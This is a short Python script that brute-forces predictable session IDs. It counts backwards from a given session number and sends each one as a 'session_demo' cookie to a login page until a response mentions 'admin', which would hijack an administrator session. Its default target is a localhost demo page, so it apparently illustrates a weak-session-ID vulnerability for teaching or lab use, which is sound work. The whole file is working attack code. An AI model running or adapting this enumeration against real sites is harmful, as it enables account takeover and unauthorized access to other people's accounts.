import argparse

import requests


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        'max_session',
        type=int,
        help='The maximum session ID presented. This script will brute-force backwards to find the admin user session'
    )
    parser.add_argument(
        '--base-url',
        default='http://localhost:5000/login_demo',
        help='The base URL of the login page'
    )
    parser.add_argument(
        '--max-iterations',
        type=int,
        default=30,
        help='Max number of sessions searched for'
    )

    return parser.parse_args()


if __name__ == '__main__':
    args = parse_args()

    current_session = args.max_session
    url = args.base_url
    max_iterations = args.max_iterations

    for i in range(max_iterations):
        current_session -= 1
        cookies = {'session_demo': str(current_session)}
        print('Trying session {}'.format(str(current_session)))
        r = requests.get(url, cookies=cookies)
        if 'admin' in r.text:
            print('Found admin in session {}'.format(current_session))
            break
    else:
        print('Did not find admin...')
